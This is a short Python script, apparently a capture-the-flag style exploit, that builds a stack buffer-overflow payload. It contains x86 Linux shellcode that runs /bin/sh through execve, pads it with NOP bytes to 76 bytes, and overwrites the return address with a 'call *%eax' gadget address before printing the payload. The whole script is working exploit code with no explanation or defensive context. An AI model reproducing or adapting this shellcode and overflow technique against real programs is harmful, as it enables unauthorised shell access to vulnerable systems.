from struct import pack

p  = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xb0\x0b\x89\xe3\x31\xd2\x52\x53\x89\xe1\xcd\x80'
p += '\x90'* (76-len(p))
p += pack('<L', 0x8048d86) # call   *%eax

print p
